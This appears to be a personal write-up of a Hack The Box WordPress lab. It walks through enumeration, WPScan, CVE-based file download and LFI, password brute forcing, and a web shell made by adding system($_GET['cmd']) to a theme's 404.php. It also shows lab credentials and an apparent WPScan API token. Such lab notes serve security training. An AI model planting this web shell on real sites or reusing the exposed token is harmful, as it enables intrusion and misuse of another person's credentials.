---
title: 'Skills Assessment:'
updated: 2023-07-23T17:01:06.0000000+01:00
created: 2023-07-22T02:43:26.0000000+01:00
---

Getting Started:

**Remember to add the website name to the etc/hosts file - otherwise the WordPress elements will not appear.** You can deduce these names via looking at the email name and blog page:
![image1](../../../../../_resources/image1-138.png)

Then you need to use sudo to edit your hosts file to add the IP and the domain names.
![image2](../../../../../_resources/image2-112.png)

This is because there isn't a DNS installed in most HTB environments, so we need to input the domain name manually.

Identifying the WordPress version number:

Our first goal is to find the Wordpress version we can do this manually via looking at the source code - or by performing an automated scan using WPScan. Simply ctrl+f in the source code of the blog website gives:
![image3](../../../../../_resources/image3-88.png)

Similarly, we can manually figure out the following:

- The Theme **twentynineteen** is being used.
  - Version 1.3
- There are a bunch of other plugins too.

Getting a shell using Metasploit:

Now that we have admin credentials, we can use Metasploit to get a reverse shell.

1.  Open msfconsole
2.  Search **wp_admin**
3.  Use **options** to configure system and **set** to config options
    1.  RHOSTS - target website
    2.  Username - admin username
    3.  Password - admin password
    4.  LHOST - VPN IP (your ip)
4.  **Exploit** the command

THIS DOESN'T WORK ^^^^^

Manual Exploitation:

1.  Navigate to the theme editor
2.  Change the 404.php of a theme to include: system(\$\_GET\['cmd'\]);
3.  Test it using curl
    1.  curl -X GET "blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=id"
    2.  ![image4](../../../../../_resources/image4-69.png)
4.  You now have a web shell
![image5](../../../../../_resources/image5-54.png)

Directory Indexing:

Manually, looking at the plugins via source code - we have directory indexing for:

- Email-subscribers plugin
- The-events-calendar plugin
- Uploads is actually has directory indexing and has the flag!
  - HTB{d1sabl3_d1r3ct0ry_l1st1ng!}

User Enumeration:

Author=1 points to an admin
Author=2 points to a user named Erika
Author=3 points to a user named Charlie Wiggins

Charlie Wiggins is our non-admin user.

WPScan:

Using our API Token (N19H91hA80yXpvNyuC0ysbERrs6m34YdDIsdU0jvTn8) we can just scan the website for vulnerabilities:
![image6](../../../../../_resources/image6-35.png)
(-e AP = enumerate all plugins). This gives us TONS of info and like 30 vulnerabilities.

Unauthenticated File Download:

[CVE-2019-19985](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19985) can be leveraged from the email-subscriber plugin. This allows an attacker to download files from the web server and can leak user details. You can exploit the unauthenticated download POC to get a flag:
![image7](../../../../../_resources/image7-29.png)

LFI (Local File Inclusion):

We can use [CVE-2018-7422](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7422) to download and look at files via a local file inclusion vulnerability. We can use the POC:
![image8](../../../../../_resources/image8-25.png)

Brute Forcing Passwords:

Using WPScan we gained creds from the "Erika" user.
![image9](../../../../../_resources/image9-21.png)
![image10](../../../../../_resources/image10-16.png)
Erika:010203

We now have access to the word press admin panel.
